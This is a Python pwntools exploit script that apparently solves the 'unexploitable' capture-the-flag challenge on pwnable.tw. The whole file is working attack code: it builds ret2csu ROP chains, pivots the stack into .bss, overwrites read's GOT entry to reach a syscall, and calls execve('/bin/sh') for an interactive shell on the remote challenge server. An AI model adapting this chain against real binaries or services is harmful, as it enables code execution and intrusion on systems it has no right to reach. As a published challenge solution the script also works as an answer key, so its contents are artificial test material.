from pwn import *
import time

ret2csu_pops             = p64(0x00000000004005e6)
ret2csu_rdx_rsi_edi      = p64(0x00000000004005ca) #  mov rdx, r15; mov rsi, r14; mov edi, r13d
read_got                 = p64(0x0000000000601000)
binsh_bss                = p64(0x0000000000601900)
address_bss              = p64(0x0000000000601a00)
address_8_bss            = p64(0x0000000000601a08)
main_address             = p64(0x0000000000400544)
pop_rbp                  = p64(0x0000000000400512)
leave_ret                = p64(0x0000000000400576)

def chain(func, arg1, arg2, arg3):
    chained  = ret2csu_pops
    chained += p64(0) # 8-byte padding
    chained += p64(0) # rbx
    chained += p64(1) # rbp
    chained += func   # r12 -> call dword [r12]
    chained += arg1   # r13 -> edi
    chained += arg2   # r14 -> rsi
    chained += arg3   # r15 -> rdx
    chained += ret2csu_rdx_rsi_edi
    chained += p64(0) * 7
    return chained

sh = process("./unexploitable")

sh = remote("chall.pwnable.tw", "10403")

#gdb.attach(sh,"""
#b*main+51
#continue
#""") 

stage_2  = chain(read_got, p64(0), binsh_bss, p64(8))      # write the string "/bin/sh\0" into some .bss memory
stage_2 += chain(read_got, p64(0), read_got, p64(1))       # overwrite the GOT pointer to point to syscall itself; RAX=1
stage_2 += chain(read_got, p64(1), binsh_bss, p64(59))     # write 59 bytes so it returns 59
stage_2 += chain(read_got, binsh_bss, p64(0), p64(0))      # now we should call execve("/bin/sh\0", NULL, NULL)

sleep(3.2)
stage_1 = b"A" * 24
stage_1 += chain(read_got, p64(0), address_8_bss, p64(len(stage_2))) 
stage_1 += pop_rbp                   # pop rbp
stage_1 += address_bss               # pivot the stack to point to the bss (just to make the exploit run faster)
stage_1 += leave_ret                 # leave; ret
sh.sendline(stage_1)

sh.send(stage_2)
sh.send(b"/bin/sh\0")
sh.send(b"\x7e")

sh.interactive()
